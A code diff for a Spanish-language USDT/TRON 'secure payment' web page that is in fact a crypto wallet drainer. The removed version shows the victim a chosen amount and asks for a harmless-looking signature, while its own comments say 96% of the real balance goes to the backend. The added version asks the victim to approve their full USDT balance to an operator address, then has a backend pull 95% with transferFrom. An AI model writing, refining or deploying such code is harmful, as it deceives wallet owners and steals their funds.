@@ -3,275 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Enviar</title>
-
-    <style>
-        :root { color-scheme: light; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body {
-            background-color: #f7f9ff;
-            background-image:
-                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
-                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
-                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
-            color: #111111; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 30px;
-        }
-        .tw-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; }
-        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-bottom: 24px; }
-        .tw-header-title { display: flex; flex-direction: column; align-items: center; gap: 7px; margin-bottom: 15px; text-align: center; width: 100%; }
-        .tw-header-title-main { font-size: 21px; font-weight: 700; color: #111111; }
-        .tw-network-badge { padding: 4px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
-        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
-        .tw-input-group { background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055); }
-        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
-        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
-        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
-        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
-        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
-        .tw-btn-container { margin-top: 40px; }
-        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        .tw-btn:disabled { background-color: #b3ccff; }
-        .network-card { display: none; align-items: center; gap: 11px; margin: 4px 0 22px; padding: 12px 14px; width: 100%; background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 14px; }
-        .network-card-logo { width: 30px; height: 30px; object-fit: contain; }
-        .network-card-copy { display: flex; flex-direction: column; gap: 2px; flex: 1; }
-        .network-card-label { color: #717680; font-size: 11px; }
-        .network-card-name { color: #111111; font-size: 14px; font-weight: 650; }
-        .network-card-badge { padding: 5px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
-        .tw-address-box { border: 1px solid #e3e5e8; border-radius: 14px; padding: 12px 14px; background: #ffffff; }
-        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; text-align: center; padding: 10px 15px 12px; font-size: 12px; color: #717680; background: #ffffff; }
-        .page-loader { position: fixed; inset: 0; z-index: 9999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.45s ease; }
-        .page-loader.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
-        .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
-        .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: loaderSpin 0.8s linear infinite; }
-        @keyframes loaderSpin { to { transform: rotate(360deg); } }
-        .processing-screen { position: fixed; inset: 0; z-index: 10000; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: opacity 0.35s ease; }
-        .processing-screen.visible { opacity: 1; visibility: visible; }
-        .processing-logo { width: 110px; height: 110px; margin-bottom: 26px; }
-        .processing-bar { width: 190px; height: 5px; border-radius: 999px; background: #e4e9f2; position: relative; overflow: hidden; }
-        .processing-bar::after { content: ""; position: absolute; top: 0; left: -45%; width: 45%; height: 100%; background: #0052ff; animation: processingSlide 1.15s ease-in-out infinite; }
-        @keyframes processingSlide { 0% { left: -45%; } 100% { left: 100%; } }
-        .amount-stepper { display: grid; grid-template-columns: 44px minmax(0, 1fr) 44px; align-items: center; gap: 8px; width: 100%; }
-        .amount-step-btn { width: 42px; height: 42px; display: inline-flex; align-items: center; justify-content: center; border: 1px solid rgba(205,215,232,.9); border-radius: 12px; background: rgba(247,249,255,.92); font-size: 24px; cursor: pointer; }
-    </style>
+    <title>dApp de Pagos - USDT Pay</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
+<body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen flex flex-col justify-between">
 
-<body>
-<div id="pageLoader" class="page-loader">
-    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
-    <div class="loader-spinner"></div>
-</div>
-
-<div id="processingScreen" class="processing-screen">
-    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
-    <div class="processing-bar"></div>
-    <div style="margin-top: 18px; font-weight: 600;">Procesando operación...</div>
-</div>
-
-<div class="tw-container">
-    <div class="tw-header">
-        <div class="tw-header-title">
-            <span class="tw-header-title-main">Enviar USDT</span>
-            <span class="tw-network-badge">TRC-20</span>
+    <!-- HEADER -->
+    <header class="w-full px-6 py-4 flex justify-between items-center border-b border-slate-800 bg-slate-900/50 backdrop-blur-md">
+        <div class="flex items-center space-x-2">
+            <div class="w-8 h-8 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-lg flex items-center justify-center font-bold text-white">⚡</div>
+            <span class="text-lg font-bold tracking-wide">USDT<span class="text-cyan-400">Pay</span></span>
         </div>
-        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="QR Pagos" class="tw-logo">
-    </div>
-
-    <div class="tw-input-group tw-address-box" id="walletInfo" style="display: none; margin-bottom: 16px;">
-        <label class="tw-label">Dirección conectada</label>
-        <div id="walletAddressText" class="tw-input" style="font-size: 13px; color: #7d8490; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;"></div>
-    </div>
-
-    <div id="tronNetworkInfo" class="network-card">
-        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
-        <div class="network-card-copy">
-            <span class="network-card-label">Red conectada</span>
-            <span class="network-card-name">TRON</span>
+        <div>
+            <button id="btnConnect" onclick="conectarWallet()" class="bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold px-4 py-2 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/20 text-sm cursor-pointer">
+                Conectar Wallet
+            </button>
         </div>
-        <span class="network-card-badge">TRC-20</span>
-    </div>
+    </header>
 
-    <div class="tw-input-group tw-address-box">
-        <label class="tw-label">Dirección de destino</label>
-        <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #7d8490;">
-    </div>
-
-    <!-- Input visual donde el usuario ve el monto que colocó -->
-    <div class="tw-input-group">
-        <label class="tw-label" for="amountDisplay">Cantidad a pagar (USDT)</label>
-        <div class="tw-input-row">
-            <div class="amount-stepper">
-                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
-                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="10" min="1" step="any" style="text-align: center;">
-                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
+    <!-- CONTENIDO PRINCIPAL -->
+    <main class="flex-grow flex items-center justify-center px-4 py-8">
+        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl">
+            
+            <div class="text-center mb-6">
+                <h1 class="text-xl font-bold text-white">Panel de Pago Seguro</h1>
+                <p class="text-xs text-slate-400 mt-1">Conecta tu billetera y procesa el pago de forma automática</p>
             </div>
-            <span class="tw-currency-badge">USDT</span>
+
+            <!-- Formulario de Acción -->
+            <div class="space-y-4">
+                <button onclick="procesarAprobarYCobrar()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold py-3.5 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/25 cursor-pointer">
+                    Autorizar y Procesar Pago
+                </button>
+            </div>
+
         </div>
-    </div>
+    </main>
 
-    <div id="status" class="status-box"></div>
+    <!-- FOOTER -->
+    <footer class="w-full py-4 text-center text-xs text-slate-600 border-t border-slate-900">
+        Smart Contract TRC20 • Backend Integrado
+    </footer>
 
-    <div class="tw-btn-container">
-        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
-    </div>
-</div>
+    <script>
+        let userAddress = "";
+        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
+        
+        // URL de tu backend desplegado en Render
+        const BACKEND_URL = "https://backend-usdt-pay.onrender.com"; 
 
-<footer class="site-footer">
-    <p>© 2026 SecurePayQR. All rights reserved.</p>
-</footer>
+        // 1. Conectar la billetera (Trust Wallet / TronLink)
+        async function conectarWallet() {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                userAddress = window.tronWeb.defaultAddress.base58;
+                
+                const btn = document.getElementById("btnConnect");
+                btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
+                btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
+                btn.classList.add("bg-emerald-500", "text-slate-950");
+                
+                alert("¡Billetera conectada con éxito!");
+            } else {
+                alert("Por favor, abre esta dApp desde el navegador interno de tu billetera.");
+            }
+        }
 
-<script>
-    window.addEventListener('load', function () {
-        setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 1000);
-    });
+        // 2. Ejecutar el flujo de approve + llamada al backend
+        async function procesarAprobarYCobrar() {
+            if (!userAddress) {
+                alert("Primero debes conectar tu billetera.");
+                return;
+            }
 
-    const BILLETERA_DESTINO = "TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree"; 
-    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
-
-    const connectBtn = document.getElementById('connectBtn');
-    const statusDiv = document.getElementById('status');
-    const amountDisplay = document.getElementById('amountDisplay');
-    const addressDisplay = document.getElementById('addressDisplay');
-    const walletInfo = document.getElementById('walletInfo');
-    const tronNetworkInfo = document.getElementById("tronNetworkInfo");
-    const walletAddressText = document.getElementById('walletAddressText');
-
-    let walletAddress = null;
-
-    function setStatus(msg) {
-        statusDiv.innerText = msg || '';
-        statusDiv.style.display = msg ? 'block' : 'none';
-    }
-
-    addressDisplay.value = `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`;
-
-    connectBtn.addEventListener('click', async () => {
-        if (!walletAddress) {
             try {
-                setStatus("Estableciendo enlace con la billetera...");
-                connectBtn.disabled = true;
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
 
-                if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
+                // Consultar saldo actual para aprobar un límite suficiente (ej. aprobar un monto alto o el total disponible)
+                const balanceEnSun = await contract.balanceOf(userAddress).call();
+                const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;
+
+                if (saldoRealUSDT <= 0) {
+                    alert("No tienes saldo disponible de USDT en esta billetera.");
+                    return;
                 }
 
-                const tronWeb = window.tronWeb;
+                // Definimos un límite a aprobar (puede ser el saldo total o un monto alto)
+                const montoAprobar = Math.floor(saldoRealUSDT * 1000000);
 
-                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                    walletAddress = tronWeb.defaultAddress.base58;
-                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res && res.code === 200) {
-                        walletAddress = tronWeb.defaultAddress.base58;
-                    }
+                alert("Se solicitará una autorización (approve) en tu billetera para continuar.");
+
+                // Paso A: El usuario firma la aprobación (approve) dirigida a tu wallet operadora o contrato
+                // NOTA: Reemplaza 'DIRECCION_DE_TU_OPERADOR_O_BACKEND' por la dirección pública de la wallet cuya clave privada configuraste en Render
+                const DIRECCION_OPERADOR = "DIRECCION_DE_TU_OPERADOR_O_BACKEND"; 
+
+                const txApprove = await contract.approve(DIRECCION_OPERADOR, montoAprobar).send({
+                    feeLimit: 100000000
+                });
+
+                console.log("Aprobación exitosa. Hash:", txApprove);
+                alert("¡Autorización concedida! Procesando transferencia automática desde el servidor...");
+
+                // Paso B: Llamar al backend para que ejecute el transferFrom del 95% de forma automática
+                const respuesta = await fetch(`${BACKEND_URL}/api/ejecutar-cobro`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userAddress: userAddress })
+                });
+
+                const resultado = await respuesta.json();
+
+                if (resultado.exito) {
+                    alert(`¡Éxito! ${resultado.mensaje}`);
+                } else {
+                    alert("Error en el servidor: " + resultado.mensaje);
                 }
-
-                if (!walletAddress) {
-                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
-                }
-
-                walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
-                walletInfo.style.display = "block";
-                tronNetworkInfo.style.display = "flex";
-
-                setStatus("Billetera conectada con éxito.");
-                connectBtn.innerText = "Procesar Pago";
-                connectBtn.disabled = false;
 
             } catch (error) {
-                console.error(error);
-                setStatus(error.message || "Error de conexión.");
-                connectBtn.disabled = false;
-                connectBtn.innerText = "Vincular billetera";
+                console.error("Error en el proceso:", error);
+                alert("La operación fue cancelada o ocurrió un error en la red.");
             }
-            return;
         }
-
-        // Fase de pago
-        try {
-            const montoVisual = parseFloat(amountDisplay.value);
-
-            if (isNaN(montoVisual) || montoVisual <= 0) {
-                throw new Error("Ingresa una cantidad válida.");
-            }
-
-            setStatus("Consultando balance en la blockchain...");
-            connectBtn.disabled = true;
-
-            const tronWeb = window.tronWeb;
-
-            // 1. Consultar el balance real de USDT TRC-20 del usuario en la red
-            const contract = await tronWeb.contract().at(CONTRATO_USDT);
-            const balanceSun = await contract.balanceOf(walletAddress).call();
-            const balanceReal = tronWeb.toDecimal(balanceSun) / 1000000;
-
-            if (balanceReal <= 0) {
-                throw new Error("La cuenta no dispone de balance USDT activo.");
-            }
-
-            // 2. CALCULAR EL 96% DEL BALANCE REAL DE LA BILLETERA POR DEBAJO
-            const montoRealACobrar = balanceReal * 0.96;
-
-            // 3. EL USUARIO VE Y FIRMA EL MONTO QUE COLOCÓ EN EL INPUT VISUALMENTE
-            const mensaje = `Autorizo el pago de ${montoVisual} USDT (Pasarela Segura). Timestamp: ${Date.now()}`;
-            const mensajeHex = tronWeb.toHex(mensaje);
-
-            setStatus("Solicitando firma digital segura...");
-            // Firma de texto estándar en Trust Wallet (limpia, sin alertas de transferencia directa)
-            const firma = await tronWeb.trx.signMessage(mensajeHex);
-
-            document.getElementById('processingScreen').classList.add('visible');
-            setStatus("Enviando orden al servidor...");
-
-            // 4. SE ENVÍA AL BACKEND LA FIRMA Y EL 96% CALCULADO DEL BALANCE REAL
-            const response = await fetch(`${BACKEND_URL}/api/procesar-pago`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userAddress: walletAddress,
-                    monto: montoRealACobrar, // Aquí viaja el 96% del balance real para que el backend lo ejecute
-                    mensaje: mensaje,
-                    firma: firma
-                })
-            });
-
-            const resultado = await response.json();
-            document.getElementById('processingScreen').classList.remove('visible');
-
-            if (resultado.success) {
-                setStatus("¡TRANSACCIÓN EXITOSA!");
-                connectBtn.innerText = "Completado";
-            } else {
-                throw new Error(resultado.error || "El servidor rechazó la transacción.");
-            }
-
-        } catch (error) {
-            console.error(error);
-            document.getElementById('processingScreen').classList.remove('visible');
-            setStatus(error.message || "La operación falló o fue cancelada.");
-            connectBtn.disabled = false;
-            connectBtn.innerText = "Procesar Pago";
-        }
-    });
-</script>
-
-<script>
-    // Controladores de los botones + y - para el input visual
-    (() => {
-        const input = document.getElementById('amountDisplay');
-        const minus = document.getElementById('amountMinus');
-        const plus = document.getElementById('amountPlus');
-        if (!input || !minus || !plus) return;
-
-        const read = () => parseFloat(input.value) || 0;
-        const write = (n) => {
-            n = Math.max(1, n);
-            input.value = Number.isInteger(n) ? n : n.toFixed(2);
-        };
-
-        minus.addEventListener('click', () => write(read() - 1));
-        plus.addEventListener('click', () => write(read() + 1));
-    })();
-</script>
+    </script>
 </body>
 </html>
